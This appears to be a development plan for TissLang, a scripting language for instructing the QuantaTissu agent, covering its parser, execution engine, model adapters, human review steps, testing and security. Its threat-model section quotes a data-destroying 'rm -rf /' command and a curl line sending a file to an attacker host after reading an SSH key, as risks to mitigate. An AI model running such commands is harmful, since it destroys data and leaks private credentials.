# TissLang Development Plan

This document outlines the development plan for **TissLang**, a high-level, declarative language designed for instructing the QuantaTissu agent.

## 1. Overview

As the QuantaTissu agent evolves, it needs a structured, reproducible, and human-readable way to define complex software development tasks. TissLang (Tissu Language) will serve as this interface, moving beyond simple natural language prompts to a formal specification for agentic workflows.

**Core Goals:**
-   **Expressiveness**: Clearly define multi-step tasks involving file I/O, code execution, and validation.
-   **Reproducibility**: Ensure that a given TissLang script produces the same agent behavior every time.
-   **Safety**: Provide clear boundaries and assertions to prevent unintended actions.
-   **Readability**: Make agent plans easy for humans to read, review, and approve.

## 2. TissLang Script Example

To make the language concrete, here is an example of a complete `.tiss` script. This script sets up a simple Python project, creates a file, runs it, and verifies the output.

```tiss
#TISS! Language=Python

TASK "Create and test a simple Python hello world script"

STEP "Create the main application file" {
    WRITE "main.py" <<PYTHON
import sys

def main():
    print(f"Hello, {sys.argv[1]}!")

if __name__ == "__main__":
    main()
PYTHON
}

STEP "Run the script and verify its output" {
    RUN "python main.py TissLang"
    ASSERT LAST_RUN.EXIT_CODE == 0
    ASSERT LAST_RUN.STDOUT CONTAINS "Hello, TissLang!"
}
```

## 2. Phase 1: Core Language Specification & Parser

**Objective**: Define the fundamental syntax and semantics of TissLang and build a parser to transform scripts into an executable format.

### 2.1. Language Grammar & Keywords
-   **Task**: Define the initial EBNF grammar for TissLang.
-   **Core Keywords**:
    -   `TASK "description"`: Defines the high-level goal of the script.
    -   `SETUP { ... }`: A block for initial environment setup (e.g., installing dependencies).
    -   `STEP "description" { ... }`: Defines a distinct, logical step in the task.
    -   `READ "path/to/file.py" AS [variable_name]`: Instructs the agent to read a file into its working context.
    -   `WRITE "path/to/file.py" <<[LANG] ... [LANG]`: Writes a block of content to a specified file, with an optional language hint for syntax highlighting.
    -   `RUN "shell command"`: Executes a shell command and captures its output.
    -   `ASSERT [condition]`: Checks a condition and halts execution on failure. Conditions will operate on the state of the last `RUN` command.
        -   `LAST_RUN.STDOUT CONTAINS "expected output"`
        -   `LAST_RUN.STDERR IS_EMPTY`
        -   `LAST_RUN.EXIT_CODE == 0`
        -   `FILE "path/to/file" EXISTS`

### 2.2. Parser Implementation
-   **Task**: Build a robust parser for TissLang scripts.
-   **Implementation**:
    -   The parser will not require a complex generator. It will be implemented as a stateful line-by-line parser in Python.
    -   The output will be a JSON-serializable list of command dictionaries, which serves as a simple, executable Abstract Syntax Tree (AST).

## 3. Phase 2: Agent Integration & Execution Engine

**Objective**: Connect the parsed TissLang script to the QuantaTissu agent's tool-use capabilities.

### 3.1. Execution Engine (AST Walker)
-   **Task**: Build an interpreter that executes the logic defined in the AST.
-   **Implementation**:
    -   The engine will iterate through the list of parsed command dictionaries.
    -   For each command (e.g., `RUN`, `WRITE`), it will invoke the corresponding agent tool (`run_shell`, `write_file`) with the specified arguments.

### 3.2. State and Context Management
-   **Task**: Manage the state of the execution environment.
-   **Implementation**:
    -   The engine will maintain a state object throughout execution.
    -   This state will include a `LAST_RUN_RESULT` dictionary containing the `stdout`, `stderr`, and `exit_code` of the most recent `RUN` command.
    -   It will also manage a dictionary of variables for files read with `READ ... AS [var]`.

### 3.3. Assertion and Correction Loop
-   **Task**: Implement the `ASSERT` logic to validate steps and trigger corrections.
-   **Implementation**:
    -   The engine will evaluate `ASSERT` conditions against the current state.
    -   On a failed assertion, it will halt execution and construct a detailed failure report. This report will be fed back into the agent's self-correction module, prompting it for a fix.

### 3.4. Interpreter Lifecycle and Command Execution
-   **Task**: Detail the step-by-step process of script execution.
-   **Implementation Details**:
    1.  **Initialization**: The interpreter is instantiated with a set of available "tools" (e.g., Python functions for `run_shell`, `write_file`, `read_file`, `evaluate_assertion`) and an initial `state` object. The state object contains keys like `variables: {}`, `last_run_result: None`, and `is_halted: False`.
    2.  **Entry Point**: The primary method is `execute(ast)`, which takes the list of command dictionaries from the parser.
    3.  **Recursive Traversal**: The `execute` method iterates through the commands in the AST.
        -   If a command is simple (like `RUN` or `WRITE`), it proceeds to dispatch.
        -   If a command is a block (like `STEP` or `SETUP`), the interpreter logs the block's description and then makes a *recursive call* to `execute()` on the nested `commands` list within that block. This naturally handles nested structures.
    4.  **Command Dispatch**: For each command, the interpreter inspects the `type` field. It uses this to look up the corresponding tool/handler function.
        -   `{'type': 'RUN', ...}` maps to the `run_shell` tool.
        -   `{'type': 'WRITE', ...}` maps to the `write_file` tool.
        -   `{'type': 'ASSERT', ...}` maps to the `evaluate_assertion` tool.
    5.  **State Mutation**: The tools are responsible for interacting with the external environment and updating the shared `state` object.
        -   The `run_shell` tool executes the command (within a sandbox) and updates `state['last_run_result']` with the `stdout`, `stderr`, and `exit_code`.
        -   The `read_file` tool reads a file's content and stores it in `state['variables']` under the specified variable name.
    6.  **Assertion and Halting**:
        -   The `evaluate_assertion` tool reads from the `state` (e.g., `state['last_run_result']['exit_code']`) to check if the condition is true.
        -   If an assertion fails, the tool raises a specific `TissAssertionError`. The interpreter catches this, sets `state['is_halted'] = True`, and stops further execution. It then generates the failure report.
    7.  **Completion**: If the interpreter finishes traversing the entire AST without halting, the execution is considered successful.

### 3.5. Execution Engine Architecture
-   **Task**: Define the key classes and software architecture of the execution engine.
-   **Implementation Details**:
    -   **`ExecutionEngine` Class**: This will be the main orchestrator.
        -   **Responsibilities**: Manages the execution flow, holds the current state, and dispatches commands to the appropriate tools.
        -   **Properties**: `self.state`, `self.tool_registry`.
        -   **Methods**: `execute(ast)`, `_execute_command(command)`.
    -   **`State` Class**: A dedicated data class to encapsulate all mutable state for a given execution run.
        -   **Schema**:
            -   `last_run_result: dict | None`: Contains `stdout`, `stderr`, `exit_code`. Initialized to `None`.
            -   `variables: dict[str, str]`: Maps variable names from `READ` commands to their string content.
            -   `is_halted: bool`: A flag that, when `True`, stops further command execution.
            -   `execution_log: list[dict]`: A structured log of every command executed and its outcome.
    -   **`ToolRegistry` Class**: A class that decouples the engine from the tools. It acts as a service locator for command handlers.
        -   **Responsibilities**: Maps a command `type` (e.g., "run", "write") to a callable function that implements the command's logic.
        -   **Methods**: `register(command_type, tool_function)`, `get_tool(command_type)`.
        -   **Benefit**: Allows new TissLang commands to be added without modifying the `ExecutionEngine`'s core logic. One simply registers a new tool.
    -   **Tool Interface (Protocol)**: A standardized signature for all tool functions.
        -   A tool must be a callable that accepts two arguments: `state: State` and `args: dict`.
        -   The `args` dictionary contains the specific parameters for that command from the AST (e.g., for a `RUN` command, `args` would be `{'command': 'python main.py'}`).
        -   Tools are expected to mutate the `state` object directly (e.g., updating `last_run_result`).
    -   **Custom Exception Handling**:
        -   The engine's `_execute_command` method will be wrapped in a `try...except` block.
        -   `TissAssertionError`: Caught to gracefully halt execution and generate a specific failure report.
        -   `TissCommandError`: Raised by tools when an underlying command fails (e.g., a file is not found for `READ`). This is also caught to halt execution.
        -   `TissSecurityError`: Raised by the sandbox or path validation logic if a command attempts a forbidden action.

## 4. Phase 3: Advanced Features & Self-Generation

**Objective**: Enhance TissLang with more powerful programming constructs and enable the agent to generate its own TissLang plans.

### 4.1. Advanced Language Features
-   **Task**: Add variables, control flow, and modularity.
-   **Implementation**:
    -   **Variables**: `VAR output = LAST_RUN.stdout`. (Extending the `READ ... AS` syntax).
    -   **Control Flow**: `IF [condition] { ... } ELSE { ... }`.
    -   **Sub-tasks**: `DEFINE_TASK "my_sub_task" { ... }` to create reusable procedures.
    -   **Error Handling**: `TRY { ... } CATCH { ... }` to gracefully handle failing commands.

### 4.2. Agent-Driven Plan Generation
-   **Task**: Teach the QuantaTissu model to write TissLang.
-   **Implementation**:
    -   Fine-tune the model on a dataset of `(natural_language_goal, tisslang_script)` pairs.
    -   The agent's first step when given a high-level goal will be to generate a `.tiss` script as its plan of action, which a human can then review and approve.

## 5. LLM Integration and Adaptability

**Objective**: Ensure TissLang can flexibly integrate with various language models, including locally hosted ones, and adapt to their specific prompting requirements.

### 5.1. Model-Agnostic Architecture
-   **Task**: Decouple the TissLang execution engine from any specific LLM implementation.
-   **Implementation**:
    -   Introduce a `LanguageModelAdapter` abstract base class or protocol. This adapter will define a standard interface for interacting with an LLM, such as `generate_response(prompt, context)`.
    -   The `ExecutionEngine` will be configured with an instance of a concrete adapter, removing any direct dependency on a specific model API.

### 5.2. Support for Local and Remote LLMs
-   **Task**: Provide concrete adapter implementations for common LLM serving patterns.
-   **Implementation**:
    -   **`LocalLlmAdapter`**: An adapter for models served via local HTTP endpoints (e.g., Ollama, llama.cpp server). It will be configured with the server URL and model name.
    -   **`ApiLlmAdapter`**: An adapter for commercial API-based models, handling authentication (API keys) and specific request formats.
    -   The choice of adapter and its configuration will be managed in `config.py`, allowing users to easily switch between a local model for privacy/cost-effectiveness and a powerful cloud model for complex tasks.

### 5.3. Flexible Prompt Templating
-   **Task**: Adapt to the diverse prompt formats required by different models (e.g., Alpaca, ChatML, Llama-2-Chat).
-   **Implementation**:
    -   Each `LanguageModelAdapter` will be responsible for applying the correct prompt template.
    -   The template will be used to structure the context (e.g., error messages, file contents) and the user's query into a format the target LLM understands best.

### 5.4. Explicit Agent Invocation Command
-   **Task**: Introduce a new TissLang command to explicitly invoke the LLM for reasoning or generation tasks.
-   **Implementation**:
    -   **`PROMPT_AGENT "natural language query" INTO [variable_name]`**: This command instructs the execution engine to call the configured LLM.
    -   The engine will gather the current state (e.g., variables from `READ` commands, `LAST_RUN_RESULT`) and pass it along with the "natural language query" to the `LanguageModelAdapter`.
    -   The adapter formats this into a final prompt, gets the response from the LLM, and the engine stores the raw text response in the specified `[variable_name]`.
    -   This makes LLM calls an explicit, reviewable step in the plan, enhancing safety and predictability.

## 6. Phase 4: Human-in-the-Loop Collaboration

**Objective**: Enhance TissLang with commands that facilitate seamless and explicit collaboration between the agent and a human developer.

### 5.1. Interactive Commands
-   **Task**: Add keywords that pause execution and require human interaction.
-   **Implementation**:
    -   `PAUSE "Reason for pausing. Please review the changes in file.py and type 'continue'."`: Explicitly stop execution and wait for human input.
    -   `REQUEST_REVIEW "Does this implementation of \`my_func\` look correct and efficient?"`: A formal request for a human code review.
    -   `CHOOSE { OPTION "Use a fast but memory-intensive algorithm" { ... } OPTION "Use a slower, memory-efficient algorithm" { ... } }`: Present multiple implementation strategies to the human and wait for their choice before proceeding.

## 7. Phase 5: Ecological Awareness & Cost Analysis

**Objective**: Integrate computational and environmental cost as a first-class citizen in TissLang, enabling the agent to create more efficient plans.

### 6.1. Cost-Aware Language Constructs
-   **Task**: Introduce keywords for estimating and constraining resource usage.
-   **Implementation**:
    -   `ESTIMATE_COST { ... }`: A block that allows the agent to get a cost estimation (e.g., in tokens, CPU-seconds, or a CO2e score) for a set of actions before executing them.
    -   `SET_BUDGET [type] = [value]`: Set hard limits on resources like `API_CALLS`, `EXECUTION_TIME`, or `TOKEN_COUNT`.
    -   `ASSERT COST < [value]`: A new assertion type to ensure a step stays within its budget.

### 6.2. "Green" Plan Generation
-   **Task**: Fine-tune the agent to favor plans with lower estimated costs.
-   **Implementation**:
    -   Prompt the agent to "find the most computationally efficient solution" or "minimize API calls."
    -   The agent will use the `ESTIMATE_COST` block in its generated plans to compare different approaches and select the most efficient one.

## 8. Phase 6: Tooling and Developer Experience

**Objective**: Build tools that make writing and debugging TissLang scripts easier for humans.

-   **Task**: Create a suite of developer tools.
-   **Implementation**:
    -   **Syntax Highlighting**: Develop extensions for popular editors like VS Code to provide syntax highlighting for `.tiss` files.
    -   **Linter**: Create a static analysis tool that checks for syntax errors, undefined file paths, and basic logical inconsistencies before execution.
    -   **Formatter**: Build an auto-formatter (like `black` or `prettier`) to ensure consistent code style.
    -   **Language Server (LSP)**: As a long-term goal, implement a Language Server to provide advanced features like autocomplete, go-to-definition, and inline error checking.

## 9. Phase 7: Language Versioning

**Objective**: Establish a clear versioning scheme to manage language evolution and ensure backward compatibility.

-   **Task**: Define and implement a versioning strategy.
-   **Implementation**:
    -   **Semantic Versioning**: TissLang will follow semantic versioning (e.g., `v1.2.0`).
    -   **Version Declaration**: Scripts can declare a required version using a pragma: `#TISS_VERSION >= 1.2`.
    -   **Engine Compatibility**: The execution engine will check the script's version and either adapt its behavior or report an incompatibility error.

## 10. Security Considerations

**Objective**: Build security into the core of TissLang's design and execution to prevent malicious or accidental damage.

### 9.1. Key Risks
-   **Command Injection**: A malicious or poorly formed prompt could cause the agent to generate a `RUN` command that damages the system (e.g., `RUN "rm -rf /"`).
-   **Unauthorized File Access**: `READ` and `WRITE` commands could be used to access or overwrite sensitive files outside the intended project directory.
-   **Resource Exhaustion**: A script could contain an infinite loop or a command that consumes all available CPU, memory, or network bandwidth.
-   **Information Leakage**: A script could be tricked into reading a sensitive file (e.g., `~/.ssh/id_rsa`) and exfiltrating its content via a `RUN` command (e.g., `RUN "curl -X POST -d @sensitive_file.txt http://attacker.com"`).

### 9.2. Mitigation Strategies
-   **Sandboxed Execution**: All `RUN` commands must be executed within a secure, isolated sandbox (e.g., a Docker container with no network access by default and a read-only file system mount for the project).
-   **Strict Path Scoping**: The execution engine must enforce a strict "project root" boundary. Any `READ` or `WRITE` operations attempting to access paths outside this root directory must be blocked.
-   **Human-in-the-Loop (HITL) for Sensitive Operations**: Any command flagged as potentially dangerous (e.g., involves `sudo`, `rm`, or network access to unknown hosts) must require explicit human approval before execution.
-   **Static Analysis for Security**: The linter (from Phase 6) will include security checks to flag risky patterns in TissLang scripts before they are run.
-   **Command Allow/Deny Lists**: The execution environment can be configured with explicit lists of allowed or denied shell commands.

## 11. Testing Strategy

**Objective**: Ensure the reliability, correctness, and robustness of the TissLang parser and execution engine through a multi-layered testing approach.

-   **Unit Tests**:
    -   **Parser**: For each keyword and syntax structure, write tests that verify correct AST generation. Include tests for malformed scripts to ensure they raise specific, informative errors.
    -   **Execution Engine**: Test each command handler in isolation with mocked tools (e.g., a fake file system, a mock shell process that returns predictable output).

-   **Integration Tests**:
    -   Test the full flow from the parser to the execution engine for simple scripts.
    -   Verify that `ASSERT` conditions correctly evaluate the state of the mocked environment after a command is executed.

-   **End-to-End (E2E) Tests**:
    -   Create a suite of example `.tiss` scripts that perform realistic tasks within a controlled environment (e.g., a temporary directory).
    -   Run the full system against these scripts and assert that the final state of the file system and command outputs are correct.

## 12. Observability and Debugging

**Objective**: Provide developers with the tools and insights needed to understand, debug, and optimize TissLang scripts.

### 11.1. Structured Logging
-   **Task**: Implement comprehensive, structured logging throughout the execution engine.
-   **Implementation**:
    -   The engine will emit logs in a machine-readable format (e.g., JSON).
    -   Each log entry will contain a timestamp, the step description, the command being executed, and its outcome (success/failure, duration, output snippets).
    -   This allows for easy filtering, searching, and analysis of script runs.

### 11.2. Dry Run Mode
-   **Task**: Add a "dry run" or "plan" mode to the execution engine.
-   **Implementation**:
    -   When run in this mode, the engine will parse the script and validate its syntax.
    -   It will print out the sequence of commands it *would* execute, but without performing any actual file I/O or shell execution.
    -   This is crucial for pre-flight checks in automated CI/CD environments.

### 11.3. Interactive Debugger (Long-Term Goal)
-   **Task**: Design and implement a step-through debugger for TissLang.
-   **Implementation**:
    -   The debugger will allow a developer to set breakpoints on specific lines or steps.
    -   When a breakpoint is hit, execution will pause, and the developer can inspect the current state (e.g., the contents of `LAST_RUN_RESULT`).
    -   The developer can then choose to step over, step into, or continue execution.

## 13. Deployment and Integration Strategy

**Objective**: Define how TissLang scripts are managed and executed within real-world development environments and CI/CD pipelines.

### 12.1. CI/CD Pipeline Integration
-   **Task**: Define how TissLang scripts are executed within automated CI/CD workflows (e.g., GitHub Actions, GitLab CI).
-   **Implementation**:
    -   Develop a dedicated command-line interface (CLI) for the TissLang execution engine that supports flags like `--dry-run` and `--sandbox-profile=[profile_name]`.
    -   Create example CI pipeline configurations (`.github/workflows/main.yml`) that demonstrate how to lint, validate (dry run), and execute TissLang scripts as part of a build or test process.

### 12.2. Script Management and Versioning
-   **Task**: Establish best practices for storing and managing TissLang scripts.
-   **Implementation**:
    -   **Human-Authored Scripts**: Scripts written by developers should be checked into the project's Git repository alongside the source code they operate on.
    -   **Agent-Generated Scripts**: Plans generated by the agent should be stored as artifacts. For approved plans that are executed, they should be logged and potentially committed to a separate `plans/` directory for auditability and reproducibility.

### 12.3. Results Reporting and Notifications
-   **Task**: Integrate the execution engine's output with common developer notification channels.
-   **Implementation**:
    -   The execution engine's CLI will have an `--output-format=json` flag to emit a structured summary of the run (success/failure, steps completed, duration, final state).
    -   Create wrapper scripts or plugins that can take this JSON output and post a summary to a Slack channel, update a GitHub pull request check, or comment on a Jira issue.

## 14. Definition of Done

-   A `.tiss` script can be written, linted, and successfully parsed into an executable AST.
-   The agent's execution engine can run a simple script involving file I/O, shell commands, and assertions.
-   The agent can generate a valid `.tiss` script as a plan in response to a natural language prompt.
-   Basic syntax highlighting is available for at least one major code editor.
-   The execution engine runs commands in a sandboxed environment.